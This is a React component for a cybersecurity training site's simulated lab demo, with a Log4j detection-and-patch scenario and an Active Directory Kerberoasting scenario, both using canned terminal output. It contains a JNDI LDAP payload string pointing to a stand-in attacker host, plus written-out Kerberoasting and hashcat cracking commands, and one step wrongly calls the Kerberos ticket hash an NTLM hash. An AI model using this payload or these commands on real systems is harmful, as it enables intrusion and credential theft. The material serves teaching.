import React, { useState } from 'react';
import { 
  Terminal as TerminalIcon, 
  Play, 
  RefreshCw, 
  CheckCircle2, 
  AlertOctagon, 
  Zap, 
  ShieldCheck, 
  Cpu, 
  Layers, 
  ExternalLink 
} from 'lucide-react';

const SCENARIOS = [
  {
    id: 'soc-triage',
    name: 'SOC Triage: Apache Log4j / Spring4Shell',
    role: 'Defensive SOC Analyst',
    difficulty: 'Intermediate',
    time: '25 min lab',
    environment: 'Ubuntu 22.04 LTS + Splunk Enterprise 9.1',
    steps: [
      {
        cmd: 'grep -E "(\\$\\{|jndi:)" /var/log/apache2/access.log',
        output: '192.168.1.104 - - [13/Nov/2026:11:42:01] "GET /login?user=${jndi:ldap://bad-actor.net/payload} HTTP/1.1" 200 452\n[MATCH FOUND] JNDI LDAP lookup exploit attempt detected in URI query parameters!',
        alertType: 'danger',
        desc: 'Detect malicious JNDI string injection in Apache web server access logs.'
      },
      {
        cmd: 'iptables -A INPUT -s 192.168.1.104 -j DROP && echo "[RULE ENFORCED]"',
        output: '[RULE ENFORCED]\nFirewall drop rule applied to inbound attacker IP 192.168.1.104.\nZero packets forwarded.',
        alertType: 'success',
        desc: 'Block malicious IP at perimeter gateway level.'
      },
      {
        cmd: 'cybrary-agent patch --cve CVE-2021-44228 --verify',
        output: '[+] Updating log4j-core-2.14.1.jar -> log4j-core-2.17.1.jar\n[+] JVM property -Dlog4j2.formatMsgNoLookups=true applied\n[✓] VERIFIED: Target is immune to CVE-2021-44228.',
        alertType: 'success',
        desc: 'Deploy patch and verify JVM configuration immunity.'
      }
    ]
  },
  {
    id: 'offensive-ad',
    name: 'Red Team: Active Directory Kerberoasting',
    role: 'Offensive Security Specialist',
    difficulty: 'Advanced',
    time: '35 min lab',
    environment: 'Kali Linux 2024.1 + Windows Server 2022 Domain Controller',
    steps: [
      {
        cmd: 'GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.10.5 -request',
        output: '[*] Querying Domain Controller for servicePrincipalName accounts...\n[+] Service: MSSQLSvc/db01.corp.local:1433\n[+] SPN Account: svc-sqladmin\n[+] Exported TGS hash ticket: $krb5tgs$23$*svc-sqladmin*corp.local...',
        alertType: 'warning',
        desc: 'Extract Kerberos Ticket Granting Service (TGS) hashes without domain admin rights.'
      },
      {
        cmd: 'hashcat -m 13100 krb5_hashes.txt /usr/share/wordlists/rockyou.txt',
        output: 'Hash.Target......: $krb5tgs$23$*svc-sqladmin*corp.local\nStatus...........: Cracked\nPlaintext........: Spring2026!$\n[!] High privilege database admin password cracked in 4.2 seconds.',
        alertType: 'danger',
        desc: 'Crack NTLM hash offline using optimized wordlist mutation rules.'
      },
      {
        cmd: 'cybrary-audit --harden-kerberos --enforce-aes',
        output: '[✓] Remediation verified:\n- svc-sqladmin password changed to 32-character randomized key\n- AES-256 Kerberos encryption strictly enforced (DES/RC4 disabled)\n- Honeypot SPN trap account created with automated SOC alert.',
        alertType: 'success',
        desc: 'Implement enterprise defense: AES-256 enforcement and Honey-SPN detection.'
      }
    ]
  }
];

export default function InteractiveLabDemo({ onOpenAuth }) {
  const [selectedScenarioIndex, setSelectedScenarioIndex] = useState(0);
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [executing, setExecuting] = useState(false);
  const [executedSteps, setExecutedSteps] = useState([0]);

  const activeScenario = SCENARIOS[selectedScenarioIndex];

  const handleRunNextStep = () => {
    if (currentStepIndex < activeScenario.steps.length - 1) {
      setExecuting(true);
      setTimeout(() => {
        const next = currentStepIndex + 1;
        setCurrentStepIndex(next);
        setExecutedSteps(prev => [...prev, next]);
        setExecuting(false);
      }, 500);
    }
  };

  const handleReset = () => {
    setCurrentStepIndex(0);
    setExecutedSteps([0]);
  };

  const handleSwitchScenario = (idx) => {
    setSelectedScenarioIndex(idx);
    setCurrentStepIndex(0);
    setExecutedSteps([0]);
  };

  return (
    <section id="labs" className="py-20 bg-[#070D18] border-t border-[#19253B] relative overflow-hidden">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-6">
          <div className="space-y-3 max-w-2xl">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0D1728] border border-[#00E599]/30 text-xs font-mono font-semibold text-[#00E599]">
              <TerminalIcon className="w-3.5 h-3.5" />
              <span>LIVE VIRTUAL LAB SANDBOX</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              Real Operating Systems. Real Adversaries. <br />
              <span className="text-[#00E599]">Zero Setup Required.</span>
            </h2>
            <p className="text-slate-400 text-sm sm:text-base">
              Try this simulated lab slice below to see how Cybrary launches pre-configured Kali Linux, Splunk, and target machines inside your browser.
            </p>
          </div>

          {/* Scenario Selector Pills */}
          <div className="flex items-center gap-2 bg-[#0A1220] p-1.5 rounded-xl border border-[#19253B]">
            {SCENARIOS.map((sc, i) => (
              <button
                key={sc.id}
                onClick={() => handleSwitchScenario(i)}
                className={`px-3.5 py-2 rounded-lg text-xs font-semibold transition-all ${
                  selectedScenarioIndex === i
                    ? 'bg-[#00E599] text-[#060B13] shadow-md font-bold'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                {sc.name.split(':')[0]}
              </button>
            ))}
          </div>
        </div>

        {/* The Sandbox Experience Box */}
        <div className="bg-[#0A1220] rounded-2xl border border-[#19253B] shadow-2xl overflow-hidden">
          
          {/* Top Bar of Sandbox */}
          <div className="bg-[#0D1728] border-b border-[#19253B] px-5 py-3.5 flex flex-wrap items-center justify-between gap-4">
            <div className="flex items-center space-x-3">
              <span className="w-3 h-3 rounded-full bg-[#00E599] animate-pulse"></span>
              <div>
                <h4 className="text-sm font-bold text-white flex items-center gap-2">
                  <span>{activeScenario.name}</span>
                  <span className="text-[10px] font-mono uppercase bg-[#19253B] text-slate-300 px-2 py-0.5 rounded">
                    {activeScenario.difficulty}
                  </span>
                </h4>
                <p className="text-xs text-slate-400 font-mono mt-0.5">
                  Host: {activeScenario.environment}
                </p>
              </div>
            </div>

            {/* Controls */}
            <div className="flex items-center space-x-3">
              <button
                onClick={handleReset}
                className="flex items-center gap-1.5 text-xs text-slate-400 hover:text-white bg-[#132139] px-3 py-1.5 rounded-lg border border-white/5 transition-colors"
                title="Restart scenario"
              >
                <RefreshCw className="w-3 h-3" />
                <span>Reset Lab</span>
              </button>

              <button
                onClick={() => onOpenAuth('signup')}
                className="flex items-center gap-1.5 text-xs font-bold text-[#060B13] bg-[#00E599] hover:bg-[#00c784] px-3.5 py-1.5 rounded-lg transition-colors shadow-sm"
              >
                <span>Launch Full 1,200+ Lab Suite</span>
                <ExternalLink className="w-3 h-3" />
              </button>
            </div>
          </div>

          {/* Sandbox Body: Split view (Step Instructions on left, Terminal on right) */}
          <div className="grid grid-cols-1 lg:grid-cols-12">
            
            {/* Left Steps Progression Panel */}
            <div className="lg:col-span-5 p-6 border-b lg:border-b-0 lg:border-r border-[#19253B] space-y-4 bg-[#080E1A]">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold">
                  Lab Objectives ({currentStepIndex + 1}/{activeScenario.steps.length})
                </span>
                <span className="text-xs text-[#00E599] font-mono">
                  {Math.round(((currentStepIndex + 1) / activeScenario.steps.length) * 100)}% Complete
                </span>
              </div>

              {/* Progress Bar */}
              <div className="w-full bg-[#19253B] h-1.5 rounded-full overflow-hidden">
                <div 
                  className="bg-[#00E599] h-full transition-all duration-300"
                  style={{ width: `${((currentStepIndex + 1) / activeScenario.steps.length) * 100}%` }}
                ></div>
              </div>

              {/* Steps List */}
              <div className="space-y-3 pt-2">
                {activeScenario.steps.map((step, idx) => {
                  const isDone = executedSteps.includes(idx) && idx <= currentStepIndex;
                  const isCurrent = idx === currentStepIndex;
                  return (
                    <div 
                      key={idx}
                      className={`p-3.5 rounded-xl border transition-all ${
                        isCurrent 
                          ? 'bg-[#0D1728] border-[#00E599]/60 shadow-[0_0_15px_rgba(0,229,153,0.1)]' 
                          : isDone
                            ? 'bg-[#0A1220] border-[#19253B] opacity-80'
                            : 'bg-[#060B13]/40 border-transparent opacity-40'
                      }`}
                    >
                      <div className="flex items-start space-x-3">
                        <div className={`mt-0.5 rounded-full p-1 ${
                          isDone 
                            ? 'bg-[#00E599]/20 text-[#00E599]' 
                            : 'bg-slate-800 text-slate-500'
                        }`}>
                          <CheckCircle2 className="w-4 h-4" />
                        </div>
                        <div className="flex-1">
                          <h5 className="text-xs font-bold text-white flex items-center justify-between">
                            <span>Step {idx + 1}: {step.cmd.split(' ')[0]}</span>
                            {isCurrent && (
                              <span className="text-[10px] text-[#00E599] font-mono font-bold animate-pulse">ACTIVE</span>
                            )}
                          </h5>
                          <p className="text-xs text-slate-400 mt-1 leading-relaxed">
                            {step.desc}
                          </p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Action Button to advance */}
              <div className="pt-2">
                {currentStepIndex < activeScenario.steps.length - 1 ? (
                  <button
                    onClick={handleRunNextStep}
                    disabled={executing}
                    className="w-full flex items-center justify-center gap-2 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm text-[#060B13] bg-[#00E599] hover:bg-[#00c784] shadow-md transition-all"
                  >
                    {executing ? (
                      <span>Executing terminal script...</span>
                    ) : (
                      <>
                        <Play className="w-4 h-4 fill-[#060B13]" />
                        <span>Execute Next Step in Sandbox</span>
                      </>
                    )}
                  </button>
                ) : (
                  <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-center space-y-2">
                    <p className="text-xs font-bold text-[#00E599]">
                      🎉 Lab Module Complete! 150 XP Awarded
                    </p>
                    <button
                      onClick={() => onOpenAuth('signup')}
                      className="text-xs text-white underline font-semibold hover:text-[#00E599]"
                    >
                      Unlock All 1,200+ Hands-On Labs with Free Trial →
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Right Terminal Output Screen */}
            <div className="lg:col-span-7 p-6 bg-[#04080F] font-mono text-xs sm:text-sm flex flex-col justify-between">
              <div className="space-y-4">
                <div className="text-slate-400 border-b border-white/5 pb-2 flex items-center justify-between text-xs">
                  <span>cybrary-box-v8: /workspace/cyber-ops</span>
                  <span className="text-[#00E599] text-[11px]">SSH-2.0-OpenSSH_9.0p1</span>
                </div>

                {/* Terminal Commands & Log Output */}
                <div className="space-y-4">
                  {activeScenario.steps.slice(0, currentStepIndex + 1).map((step, idx) => (
                    <div key={idx} className="space-y-1.5 animate-in fade-in duration-300">
                      <div className="text-[#00E599] flex items-center gap-1 font-semibold">
                        <span className="text-slate-400">root@cybrary-sandbox:~#</span>
                        <span>{step.cmd}</span>
                      </div>
                      <pre className="text-slate-300 bg-[#0A1220] p-3 rounded-lg border border-[#19253B] whitespace-pre-wrap font-mono text-xs leading-relaxed">
                        {step.output}
                      </pre>
                    </div>
                  ))}
                  {executing && (
                    <div className="text-[#00E599] flex items-center gap-2 pt-2">
                      <span className="animate-spin">●</span>
                      <span>Injecting payload and correlating network artifacts...</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Bottom Quick Indicator */}
              <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-between text-[11px] text-slate-400">
                <span className="flex items-center gap-1.5">
                  <Cpu className="w-3.5 h-3.5 text-[#00E599]" /> Isolated Dedicated Container (4 vCPU, 8GB RAM)
                </span>
                <span className="text-slate-500">Latency: 8ms</span>
              </div>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
}

